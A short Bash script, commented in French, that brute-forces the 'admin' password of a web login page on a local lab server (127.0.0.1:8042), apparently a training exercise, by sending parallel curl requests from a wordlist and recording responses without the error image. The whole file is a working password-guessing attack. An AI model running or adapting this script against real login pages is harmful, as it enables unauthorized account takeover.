#!/bin/bash

# Fichier de sortie
output_file="output"

# Vider le fichier de sortie au début
> "$output_file"

# Nombre maximum de processus parallèles
max_jobs=20

# Fonction pour tester un mot de passe
test_password() {
    local pwd="$1"
    
    # Effectuer la requête HTTP en mode silencieux
    response=$(curl -s "http://127.0.0.1:8042/?page=signin&username=admin&password=${pwd}&Login=Login")
    
    # Vérifier si la réponse ne contient pas l'image d'erreur
    if [[ "$response" != *"images/WrongAnswer.gif"* ]]; then
        # Écrire le mot de passe trouvé dans le fichier de sortie
        echo "$pwd" >> "$output_file"
        echo "Mot de passe trouvé : $pwd"
    fi
}

# Initialiser le compteur de jobs
current_jobs=0

# Lire le fichier pwdlist ligne par ligne
while IFS= read -r pwd; do
    # Appeler la fonction test_password en arrière-plan
    test_password "$pwd" &
    
    # Incrémenter le compteur de jobs
    current_jobs=$((current_jobs + 1))
    
    # Si le nombre de jobs atteint max_jobs, attendre que l'un se termine
    if [[ "$current_jobs" -ge "$max_jobs" ]]; then
        # Attendre que n'importe quel job se termine
        wait -n
        # Décrémenter le compteur de jobs
        current_jobs=$((current_jobs - 1))
    fi
done < "./pwdlist"

# Attendre que tous les jobs en arrière-plan soient terminés
wait

echo "Tous les mots de passe ont été testés. Résultats enregistrés dans '$output_file'."
